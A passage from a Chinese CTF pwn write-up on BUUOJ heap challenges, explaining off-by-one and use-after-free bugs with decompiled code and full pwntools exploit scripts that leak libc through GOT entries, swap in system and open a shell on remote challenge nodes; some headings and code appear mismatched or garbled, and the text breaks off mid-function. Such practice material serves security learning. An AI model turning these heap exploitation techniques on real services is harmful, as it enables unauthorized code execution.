然后我们对chunk0进行输入，溢出一字节，覆盖chunk1_header的size位为0x81，然后将chunk1
free掉，chunk1_header同时也被free掉，然后这就有了一块大小为0x80的空闲chunk。我们申请大小为0x70的chunk，就可以申请到这块空间。这时下图所示的黄色区域都是我们申请来的chunk，我们想要修改got表，可以将free函数的got表地址写入chunk2_header的原存储chunk2地址处，这样我们对chunk2进行输出时，实际上就是输出free函数的实际地址，泄露出libc的基址，然后将system函数写入，进行free时实际上就是运行了system函数，从而进行getshell。
exp：
    from pwn import *
    from LibcSearcher import *
    context(arch = 'amd64', os = 'linux', log_level = 'debug')
    io = process('./heapcreator')
    io = remote('node3.buuoj.cn', 29320)
    elf = ELF('./heapcreator')
    free_got = elf.got['free']
    def add(size, content):
        io.sendlineafter('Your choice :', '1')
        io.sendlineafter('Size of Heap : ', str(size))
        io.sendlineafter('Content of heap:', content)
    def edit(index, content):
        io.sendlineafter('Your choice :', '2')
        io.sendlineafter('Index :', str(index))
        io.sendlineafter('Content of heap : ', content)
    def display(index):
        io.sendlineafter('Your choice :', '3')
        io.sendlineafter('Index :', str(index))
    def delete(index):
        io.sendlineafter('Your choice :', '4')
        io.sendlineafter('Index :', str(index))
    add(0x18, 'aaaa') # 0
    add(0x10, 'bbbb') # 1
    add(0x10, 'cccc') # 2
    add(0x10, '/bin/sh') # 3
    edit(0, 'a' * 0x18 + '\x81')
    delete(1)
    payload = 'a' * 0x40 + p64(8) + p64(free_got)
    add(0x70, payload) # 1
    display(2)
    io.recvuntil('Content : ')
    free_addr = u64(io.recvuntil('Done')[:-5].ljust(8,'\x00'))
    print(hex(free_addr))
    libc = LibcSearcher('free', free_addr)
    libc_base = free_addr - libc.dump('free')
    system = libc_base + libc.dump('system')
    print(hex(system))
    edit(2, p64(system))
    delete(3)
    io.interactive()
## 0x08 0ctf_2017_babyheap
同[babyheap_0ctf_2017](https://so4ms.top/index.php/2021/04/06/pwn%e5%ad%a6%e4%b9%a0-buuoj%ef%bc%88heap%ef%bc%89/#toc-head-1 "babyheap_0ctf_2017")
## 0x09 hitcontraining_bamboobox
还是一道菜单堆题，先来看看申请chunk，这一块代码，用了itemlist来存储申请的chunk的大小和chunk的content地址。
        for ( i = 0; i = dword_804A04C )
      {
        puts("Out of bound!");
        _exit(0);
      }
      if ( *(&ptr + v1) )
      {
        free(*((void **)*(&ptr + v1) + 1));
        free(*(&ptr + v1));
        puts("Success");
      }
      return __readgsdword(0x14u) ^ v3;
    }
然后看看输出函数，这里他是利用固定申请的那块chunk里存的那个函数来进行输出，那么思路就出来了，利用UAF，覆盖掉这个函数的地址为puts函数的got表地址，然后就可以泄露出libc的基址了。
    unsigned int display()
    {
      int v1; // [esp+4h] [ebp-14h]
      char buf[4]; // [esp+8h] [ebp-10h] BYREF
      unsigned int v3; // [esp+Ch] [ebp-Ch]
      v3 = __readgsdword(0x14u);
      printf("Index :");
      read(0, buf, 4u);
      v1 = atoi(buf);
      if ( v1 = dword_804A04C )
      {
        puts("Out of bound!");
        _exit(0);
      }
      if ( *(&ptr + v1) )
        (*(void (__cdecl **)(_DWORD))*(&ptr + v1))(*(&ptr + v1));
      return __readgsdword(0x14u) ^ v3;
    }
我们先申请两块大小为24的chunk，然后依次free掉两块chunk，这时堆空间的分布情况如下，然后根据FILO的原则，如果我们此时申请大小为8，那么就会先申请chunk1_header作为chunk2_header的空间，而chunk0_header就会作为chunk2的空间，此时我们进行输入，就会覆盖chunk0_header的内容，而由于存在UAF漏洞，且ptr数组没有删去已经free掉的数据，我们就可以覆盖chunk0_header里存储的chunk0的地址为puts函数的got表地址，输出chunk0的数据，就把puts函数的真实地址泄露出来了，就得到了libc的基址，如法炮制将chunk0_header的输出函数地址覆盖为system函数的地址，后面修改为`||sh`
字符串即可getshell。
这里之所以是`||sh`
字符串，是因为在输出函数中，参数传入的是该note的地址，他会对该地址进行加4处理，才对应到我们输入的内容的地址，当我们将其修改为system函数的地址后，参数就是system函数的地址所在的地址了，而把该地址中的内容当做字符串就是`p32(system)||sh`，当system执行
p32(system)||sh ，因为无法解析p32(system)，就会转而执行sh，这样我们就拿到了shell。
    int __cdecl sub_804862B(int a1)
    {
      return puts(*(const char **)(a1 + 4));
    }
exp:
    from pwn import *
    context(log_level='debug', arch='i386', os='linux')
    io = process('./hacknote')
    io = remote('node3.buuoj.cn', 26831)
    elf = ELF('./hacknote')
    libc = ELF('./libc-2.23-32.so')
    def add(size, content):
        io.sendlineafter('Your choice :', str(1))
        io.sendafter('Note size :', str(size))
        io.sendafter('Content :', content)
    def delete(index):
        io.sendlineafter('Your choice :', str(2))
        io.sendlineafter('Index :', str(index))
    def display(index):
        io.sendlineafter('Your choice :', str(3))
        io.sendlineafter('Index :', str(index))
    add(24, 'a' * 24)
    add(24, 'b' * 24)
    delete(0)
    delete(1)
    # gdb.attach(io)
    add(8, p32(0x804862B) + p32(elf.got["puts"]))
    display(0)
    libc_base = u32(io.recvuntil("\xf7")[-4: ]) - libc.symbols["puts"]
    info("libc_base -> 0x%x" % libc_base)
    delete(2)
    print(hex(libc.symbols['system'] + libc_base))
    payload = p32(libc.symbols['system'] + libc_base) + '||sh'
    add(8, payload)
    # gdb.attach(io)
    display(0)
    io.interactive()
## 0x0b hitcon2014_stkof
还是一道菜单堆题，但是这次只给了添加，修改，删除三个功能，第四个选项没有什么用，不会给我们输出chunk的内容。
先来看看添加函数的代码，它用了一个数组来存储我们申请的内存，而且这里对数组下标进行修改是先进行自增再进行数组内容修改，也就是说数组下标为0处没有内容。
    __int64 add()
    {
      __int64 size; // [rsp+0h] [rbp-80h]
      char *v2; // [rsp+8h] [rbp-78h]
      char s[104]; // [rsp+10h] [rbp-70h] BYREF
      unsigned __int64 v4; // [rsp+78h] [rbp-8h]
      v4 = __readfsqword(0x28u);
      fgets(s, 16, stdin);
      size = atoll(s);
      v2 = (char *)malloc(size);
      if ( !v2 )
        return 0xFFFFFFFFLL;
      (&chunk_array)[++index] = v2;
      printf("%d\n", (unsigned int)index);
      return 0LL;
    }
    ``
    然后来看看修改函数，这里对内容的修改没有对我们输入的长度大小进行判断，存在溢出。
    ```c
    __int64 edit()
    {
      __int64 result; // rax
      int i; // eax
      unsigned int v2; // [rsp+8h] [rbp-88h]
      __int64 size; // [rsp+10h] [rbp-80h]
      char *ptr; // [rsp+18h] [rbp-78h]
      char s[104]; // [rsp+20h] [rbp-70h] BYREF
      unsigned __int64 v6; // [rsp+88h] [rbp-8h]
      v6 = __readfsqword(0x28u);
      fgets(s, 16, stdin);
      v2 = atol(s);
      if ( v2 > 0x100000 )
        return 0xFFFFFFFFLL;
      if ( !(&chunk_array)[v2] )
        return 0xFFFFFFFFLL;
      fgets(s, 16, stdin);
      size = atoll(s);
      ptr = (&chunk_array)[v2];
      for ( i = fread(ptr, 1uLL, size, stdin); i > 0; i = fread(ptr, 1uLL, size, stdin) )
      {